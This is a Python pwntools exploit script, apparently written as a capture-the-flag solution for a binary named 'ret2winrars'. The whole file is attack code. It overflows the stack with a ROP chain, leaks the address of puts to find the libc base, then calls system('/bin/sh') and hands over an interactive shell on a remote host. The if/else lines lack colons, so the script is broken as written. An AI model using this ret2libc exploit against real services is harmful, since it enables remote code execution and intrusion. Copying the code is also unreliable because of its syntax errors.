#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import os

#lib = ELF("/usr/lib/libc.so.6")
JUST_LEAK = False
exe = context.binary = ELF('./ret2winrars')
if os.path.isfile("./libc.so.6")
    lib = ELF("./libc.so.6")
else
    JUST_LEAK = True

host = args.HOST or '__HOST__'
port = int(args.PORT or 1337)

## Settings
JUNK_PAD = 40
POP_RDI = 0x40124b
LIBC_OFFSET = 0x875a0

def local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

io = start()

junk = b"\x55" * JUNK_PAD # junk to burst the stack
pop_rdi = p64(POP_RDI) # pop rdi ; ret
ret = p64(POP_RDI + 1) # ret; stack aling
puts_got = p64(exe.got["puts"])
puts_plt = p64(exe.plt["puts"]) 
# pass a got to plt:
# plt_puts(&got_puts);
main = p64(exe.symbols["main"]) # go back to main

# mount payload
buf = b""
buf += junk
buf += pop_rdi
buf += puts_got
buf += puts_plt
buf += main

sleep(0.5) # sleep to wait connection
log.info(io.recv())
print()
sleep(0.5)
io.sendline(buf)
sleep(0.5)
data = u64(io.recvline().strip().ljust(8,b"\x00")) # get a puts addr's
log.success("Leak puts addr: " + hex(data))
print()

if JUST_LEAK: exit()

libc_base = data - LIBC_OFFSET # puts offset, this is specific to libc
lib.address = libc_base

bin_sh = next(lib.search(b"/bin/sh\x00"))
system_addr = lib.symbols["system"]

log.success("Libc addr: " + hex(libc_base))
log.success("/bin/sh:   " + hex(bin_sh))
log.success("system:    " + hex(system_addr))
print()

buf = b""
buf += junk
buf += ret
buf += pop_rdi
buf += p64(bin_sh)
buf += p64(system_addr)

sleep(1)
log.info(io.recv(1024))
sleep(1)
io.sendline(buf)
sleep(1)

io.interactive()
